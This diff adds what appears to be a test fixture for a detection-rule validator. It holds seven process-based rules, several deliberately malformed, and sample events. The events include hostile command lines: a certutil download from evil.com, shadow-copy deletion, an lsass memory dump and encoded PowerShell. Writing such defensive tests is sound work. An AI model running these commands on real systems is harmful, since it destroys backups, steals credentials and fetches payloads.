@@ -1,0 +1,116 @@
+{
+  "rules": [
+    {
+      "rule_id": "DET-001",
+      "title": "PowerShell Encoded Command Execution",
+      "mitre_technique": "T1059.001",
+      "level": "high",
+      "detection": {
+        "selection": {
+          "process_name|endswith": "powershell.exe",
+          "command_line|contains|any": ["-enc", "-encodedcommand"]
+        }
+      },
+      "condition": "selection"
+    },
+    {
+      "rule_id": "DET-002",
+      "title": "Shadow Copy Deletion (Ransomware Precursor)",
+      "mitre_technique": "T1490",
+      "level": "critical",
+      "detection": {
+        "selection": {
+          "process_name|endswith": "vssadmin.exe",
+          "command_line|contains": "delete"
+        }
+      },
+      "condition": "selection"
+    },
+    {
+      "rule_id": "DET-003",
+      "title": "BROKEN - Missing condition field",
+      "mitre_technique": "T1059.003",
+      "level": "high",
+      "detection": {
+        "selection": {
+          "process_name|endswith": "cmd.exe"
+        }
+      }
+    },
+    {
+      "rule_id": "DET-004",
+      "title": "Overly Broad Process Match",
+      "mitre_technique": "T1059.003",
+      "level": "low",
+      "detection": {
+        "selection": {
+          "process_name": "cmd.exe"
+        }
+      },
+      "condition": "selection"
+    },
+    {
+      "rule_id": "DET-005",
+      "title": "Invalid MITRE ID Format",
+      "mitre_technique": "T59.1",
+      "level": "medium",
+      "detection": {
+        "selection": {
+          "process_name|endswith": "certutil.exe",
+          "command_line|contains|all": ["-urlcache", "http"]
+        }
+      },
+      "condition": "selection"
+    },
+    {
+      "rule_id": "DET-006",
+      "title": "Bad Severity Level",
+      "mitre_technique": "T1003.001",
+      "level": "super-duper-critical",
+      "detection": {
+        "selection": {
+          "process_name|endswith": "procdump.exe",
+          "command_line|contains": "lsass"
+        }
+      },
+      "condition": "selection"
+    },
+    {
+      "rule_id": "DET-007",
+      "title": "Net.exe Domain Admin Enumeration",
+      "mitre_technique": "T1087.002",
+      "level": "medium",
+      "detection": {
+        "selection": {
+          "process_name|endswith": "net.exe",
+          "command_line|contains": "domain admins"
+        }
+      },
+      "condition": "selection"
+    }
+  ],
+  "test_corpus": [
+    {"case_id": "TC-01", "expected_rule": "DET-001",
+     "event": {"process_name": "powershell.exe", "command_line": "powershell.exe -nop -w hidden -enc SQBFAFgA=="}},
+    {"case_id": "TC-02", "expected_rule": null,
+     "event": {"process_name": "powershell.exe", "command_line": "powershell.exe Get-Process"}},
+    {"case_id": "TC-03", "expected_rule": "DET-002",
+     "event": {"process_name": "vssadmin.exe", "command_line": "vssadmin.exe delete shadows /all /quiet"}},
+    {"case_id": "TC-04", "expected_rule": null,
+     "event": {"process_name": "vssadmin.exe", "command_line": "vssadmin.exe list shadows"}},
+    {"case_id": "TC-05", "expected_rule": "DET-004",
+     "event": {"process_name": "cmd.exe", "command_line": "cmd.exe /c dir"}},
+    {"case_id": "TC-06", "expected_rule": null,
+     "event": {"process_name": "powershell.exe", "command_line": "powershell.exe Get-Service"}},
+    {"case_id": "TC-07", "expected_rule": "DET-005",
+     "event": {"process_name": "certutil.exe", "command_line": "certutil.exe -urlcache -f http://evil.com/p.exe"}},
+    {"case_id": "TC-08", "expected_rule": null,
+     "event": {"process_name": "certutil.exe", "command_line": "certutil.exe -verify cert.cer"}},
+    {"case_id": "TC-09", "expected_rule": "DET-006",
+     "event": {"process_name": "procdump.exe", "command_line": "procdump.exe -ma lsass.exe out.dmp"}},
+    {"case_id": "TC-10", "expected_rule": "DET-007",
+     "event": {"process_name": "net.exe", "command_line": "net group \"domain admins\" /domain"}},
+    {"case_id": "TC-11", "expected_rule": null,
+     "event": {"process_name": "net.exe", "command_line": "net use Z: \\\\server\\share"}}
+  ]
+}
